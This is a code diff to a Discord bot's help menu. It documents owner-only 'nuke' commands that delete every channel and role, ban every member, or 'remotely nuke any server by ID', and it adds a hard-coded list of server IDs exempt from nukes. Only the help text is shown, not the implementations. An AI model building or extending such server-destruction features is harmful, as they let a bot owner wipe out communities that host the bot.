@@ -157,13 +157,16 @@ const CATEGORIES = {
         color: 0xED4245,
         description: '⚠️ **These commands are extremely destructive and irreversible.**\nAll require bot owner. Nuke commands show a button confirmation first.',
         commands: [
-            ['`>nuke`', 'Deletes **all channels and roles** in the server — shows a Confirm/Cancel button first\nA **#recovery** channel is created with a Restore button'],
+            ['`>nuke`', 'Deletes **all channels and roles** in the current server — shows a Confirm/Cancel button first\nA **#recovery** channel is created with a Restore button'],
             ['`>nukev2`', 'Bans **every member and bot**, then deletes all channels and roles — shows a Confirm/Cancel button first\nNo restore available'],
+            ['`>nukev3 <server_id>`', 'Remotely nukes any server by ID — works even if you are not in that server\nShows a Confirm/Cancel button first'],
             ['`>gban <userID> [reason]`', 'Bans a user from **every server** the bot is in'],
             ['`>gunban <userID>`', 'Unbans a user from **every server** the bot is in'],
         ],
     },
 };
+
+const NUKE_PROTECTED_IDS = ['1412267331266281593'];
 
 export default {
     name: 'help-menu',
@@ -180,6 +183,14 @@ export default {
             .setDescription(`${cat.description}\n\n${lines}`)
             .setFooter({ text: 'Prefix: > • Use >help to return to the menu' })
             .setTimestamp();
+
+        if (value === 'dangers') {
+            const protectedLines = NUKE_PROTECTED_IDS.map(id => {
+                const g = interaction.client.guilds.cache.get(id);
+                return g ? `🛡️ **${g.name}** (\`${id}\`)` : `🛡️ \`${id}\``;
+            }).join('\n');
+            embed.addFields({ name: '🔒 Protected Servers (immune to all nukes)', value: protectedLines });
+        }
 
         await interaction.update({ embeds: [embed] });
     },
